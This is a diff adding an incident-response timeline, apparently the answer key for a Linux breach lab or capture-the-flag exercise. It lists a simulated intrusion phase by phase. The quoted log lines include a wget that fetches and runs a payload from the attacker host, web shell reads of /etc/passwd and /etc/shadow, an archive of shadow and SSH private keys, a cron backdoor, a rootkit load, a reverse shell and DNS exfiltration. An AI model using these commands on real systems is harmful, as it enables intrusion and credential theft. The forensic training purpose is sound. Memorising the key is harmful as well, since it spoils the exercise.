@@ -1,0 +1,71 @@
+LINUX BREACH INVESTIGATION — CANONICAL ATTACK TIMELINE
+=======================================================
+Analyst: Arnold Mavhezha
+System: webserver (10.0.1.50)
+Attacker: 198.51.100.47
+C2 Server: 203.0.113.99 / evil-c2.example.com
+Date: 2025-11-14
+=======================================================
+
+PHASE 1 — RECONNAISSANCE
+-------------------------
+2025-11-14T02:55:00Z | apache-access.log  | Directory enumeration via DirBuster from 198.51.100.47
+2025-11-14T03:00:12Z | ids-alerts.json    | Nmap SYN scan targeting 10.0.1.50 (ports 22,80,443,8080,3306)
+
+PHASE 2 — INITIAL ACCESS
+-------------------------
+2025-11-14T03:12:06Z | auth.log           | SSH brute force begins (83 failed attempts from 198.51.100.47)
+2025-11-14T03:28:00Z | auth.log           | SSH brute force succeeds — admin account compromised
+
+PHASE 3 — EXPLOITATION
+-----------------------
+2025-11-14T03:30:00Z | apache-access.log  | Web shell uploaded: POST /uploads/shell.php (200 OK)
+2025-11-14T03:31:00Z | apache-access.log  | Web shell executed: cmd=id, cmd=whoami, cmd=cat+/etc/passwd
+
+PHASE 4 — PRIVILEGE ESCALATION
+--------------------------------
+2025-11-14T03:31:00Z | auth.log           | sudo /bin/bash executed — root access gained
+
+PHASE 5 — EXECUTION
+--------------------
+2025-11-14T03:32:00Z | bash-history       | wget http://198.51.100.47/payload.elf -O /tmp/.update/beacon
+2025-11-14T03:32:00Z | bash-history       | chmod +x /tmp/.update/beacon && nohup /tmp/.update/beacon &
+2025-11-14T03:32:00Z | pslist/cmdline     | beacon running as kworker-update (PID 31337) with AES-256 to 203.0.113.99:443
+
+PHASE 6 — CREDENTIAL ACCESS
+-----------------------------
+2025-11-14T03:33:00Z | apache-access.log  | cat /etc/shadow executed via web shell
+2025-11-14T03:33:00Z | bash-history       | tar czf /var/tmp/.cache/exfil.tar.gz /etc/shadow /home/*/.ssh/id_rsa /home/*/.bash_history
+
+PHASE 7 — PERSISTENCE
+----------------------
+2025-11-14T03:33:00Z | auth.log           | useradd svc-backup (UID 1002, /bin/bash)
+2025-11-14T03:33:01Z | auth.log           | passwd changed for svc-backup (Sup3rS3cret!)
+2025-11-14T03:34:00Z | auth.log           | SSH key injected: /home/svc-backup/.ssh/authorized_keys
+2025-11-14T03:45:00Z | syslog             | Cron job added: */5 * * * * /tmp/.hidden/beacon.sh
+
+PHASE 8 — COMMAND AND CONTROL
+-------------------------------
+2025-11-14T03:47:00Z | syslog/capture     | Reverse shell callback: 10.0.1.50 → 203.0.113.99:4444
+2025-11-14T03:47:22Z | ids-alerts.json    | IDS alert: reverse shell connection confirmed
+
+PHASE 9 — DEFENSE EVASION
+--------------------------
+2025-11-14T03:50:00Z | kern.log           | insmod /tmp/rootkit_mod.ko — kernel module loaded
+2025-11-14T03:50:01Z | kern.log           | rootkit_mod hiding PID 31337 (beacon process)
+
+PHASE 10 — EXFILTRATION
+------------------------
+2025-11-14T03:55:00Z | ids-alerts.json    | DNS exfiltration: base64 subdomains to evil-c2.example.com
+2025-11-14T03:55:00Z | capture.pcap       | stolen_credentials encoded in DNS TXT queries
+
+PLANNED (NOT EXECUTED DURING CAPTURE WINDOW)
+--------------------------------------------
+2025-11-15T02:00:00Z | deleted-files.img  | OPERATION NIGHTFALL — DNS tunnel exfil of customer DB + financial records
+
+=======================================================
+TOTAL ATTACK DURATION: ~1 hour (02:55 → 03:55)
+MITRE ATT&CK TECHNIQUES IDENTIFIED: 10
+PERSISTENCE MECHANISMS: 3
+FLAGS CAPTURED: 29/31
+=======================================================
